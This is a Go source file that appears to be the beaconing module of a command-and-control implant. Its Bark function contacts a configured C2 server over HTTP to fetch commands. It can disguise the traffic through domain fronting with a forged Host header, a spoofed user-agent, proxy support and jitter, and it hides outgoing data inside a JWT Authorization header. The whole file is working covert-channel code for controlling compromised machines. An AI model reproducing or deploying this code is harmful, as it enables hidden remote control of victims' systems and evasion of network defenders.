package bark

import (
	"bytes"
	"io"
	"net/http"
)

type Barker interface {
	Bark(BarkMsg) ([]byte, error)
}

type BarkConfig struct {
	//addr
	Addr string

	//Host header (for domain fronting) and user-agent
	Hh string
	Ua string

	Proxyurl  string
	Proxyuser string
	Proxy     bool

	//transport
	Jit float64
	Tr  http.RoundTripper

	//cookies:
	Jar http.CookieJar
}

type BarkMsg struct {
	Uri    string
	Method string

	//Data for the C2 Serv can be in the auth header, or body.
	//Choose whatever is best for you.
	AuthHeader []byte
	Body       []byte
}

// Beacon out for cmd
func (barkerconf *BarkConfig) Bark(Msg BarkMsg) ([]byte, error) {
	var buf *bytes.Buffer

	if Msg.Body != nil {
		buf = bytes.NewBuffer(Msg.Body)
	} else {
		buf = nil
	}

	//Create new request
	request, err := http.NewRequest(Msg.Method, barkerconf.Addr+Msg.Uri, buf)
	if err != nil {
		return nil, err
	}
	if barkerconf.Hh != "" {
		request.Host = barkerconf.Hh

	}
	request.Header.Set("User-Agent", barkerconf.Ua)
	if Msg.AuthHeader != nil {
		authstr, err := BuryinJwt(Msg.AuthHeader)
		if err != nil {
			return nil, err
		}
		request.Header.Set("Authorization", "Bearer "+authstr)
	}

	//init client and send request.
	client := &http.Client{Transport: barkerconf.Tr}
	var resp *http.Response
	resp, err = client.Do(request)
	if err != nil {

		return nil, err
	}
	defer resp.Body.Close()

	request.Close = true

	if resp.StatusCode != 200 {

		return nil, nil
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {

		return nil, nil
	}

	return body, nil
}
